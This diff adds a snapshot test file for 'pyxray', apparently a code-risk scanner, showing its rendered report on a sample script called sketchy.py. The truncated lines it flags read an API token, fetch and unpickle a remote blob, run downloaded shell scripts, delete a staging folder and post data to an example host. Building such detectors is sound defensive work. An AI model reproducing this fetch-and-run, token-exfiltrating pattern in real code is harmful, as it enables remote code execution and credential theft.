@@ -1,0 +1,74 @@
+---
+source: crates/pyxray-render/tests/snapshots.rs
+expression: text
+---
+
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+ pyxray  sketchy.py                               21 lines · 16 statements · depth 2 · cyclomatic 2
+ reads the environment → makes 2 network calls → DELETES /tmp/stage → evaluates code at runtime (+…
+ risk ██████████████████  100  read it first                                      ·▸× ≈»§ ‡ ···· ¶·
+
+ TEXTURE
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+ ▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▄▄▄▄▄█████▄▄▄▄▄····▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+               !!!!!         !!!!!▸▸▸▸▸    !!!!!    !!!!!         ▸▸▸▸▸▸▸▸▸!!!!!!    !!!!!!!!!!¶¶¶¶
+ L1                                                                                            L21
+
+ FLOW                                                    CAPABILITIES
+ ──────────────────────────────────────────────────────  ──────────────────────────────────────────
+    1   ├─ import os, subprocess, shutil, pickle, bas…    ≈ net 2!   § env 2!   » shell 2!
+    2   ├─ import requests                                × delete 1!   ‡ eval 1!   ▸ write 3
+    4 ! ├─ TOKEN = os.environ["API_TOKEN"]          env   ¶ print 1
+    5   ├─ STAGING = "/tmp/stage"
+    7 ! ├─ shutil.rmtree(STAGING, ignore_error…  delete  WHAT IT DOES
+    8   ├─ os.makedirs(STAGING)                   write  ──────────────────────────────────────────
+   10 ! ├─ resp = requests.get("https://example.i…  net     4 ! § getenv   AP…! reads a secret fro…
+   11   ├─ blob = base64.b64decode(resp.content)            7 ! × rmtree   /t…! recursively delete…
+   12 ! ├─ config = pickle.loads(blob)             eval     8   ▸ mkdir    /tmp/stage
+   14 ! ├─ for name, script in config["steps"]             10 ! ≈ GET      ht…! verify=False — TLS…
+   15   │  ├─ with open(f"{STAGING}/{name}.sh",…  write    12 ! ‡ unpickle pi…! unpickling runs ar…
+   16   │  │  └─ fh.write(script)                 write    15 · ▸ truncate f"{STAGING}/{name}.sh"
+   17 ! │  └─ subprocess.run(f"bash {STAGING}/{…  shell    16 · ▸ write    open(f"{STAGING}/{name}…
+   19 ! ├─ requests.post("https://example.inv…  net env    17 ! » run      f"…! runs an external c…
+   20 ! ├─ subprocess.run(["rm", "-rf", STAGING…  shell    19 ! ≈ POST     ht…! sends data to a re…
+   21   └─ print("done")                          print    19   § probe    os.uname
+                                                           20 ! » run      ["…! runs an external c…
+                                                           21   ¶ print    done
+
+                                                         IMPORTS
+                                                         ──────────────────────────────────────────
+                                                           os
+                                                           subprocess
+                                                           shutil
+                                                           pickle
+                                                           base64
+                                                         • requests
+
+                                                         VALUES
+                                                         ──────────────────────────────────────────
+                                                            4 TOKEN   ?        os.environ["API_TO…
+                                                            5 STAGING str      "/tmp/stage"
+                                                           10 resp    response requests.get("http…
+                                                           11 blob    ?        base64.b64decode(r…
+                                                           12 config  ?        pickle.loads(blob)
+                                                           14 name    ?        config["steps"]
+                                                           14 script  ?        config["steps"]
+                                                           15 fh      file     open(f"{STAGING}/{…
+
+                                                         CALLS
+                                                         ──────────────────────────────────────────
+                                                         subprocess.run                          x2
+                                                         open
+                                                         print
+                                                         base64.b64decode
+                                                         <file>.write
+                                                         os.makedirs
+                                                         os.uname
+                                                         pickle.loads
+                                                         requests.get
+                                                         requests.post
+
+                                                         SHAPE
+                                                         ──────────────────────────────────────────
+                                                         21     16     2      2      0      12
+                                                         lines  stmts  depth  cyclo  defs   calls
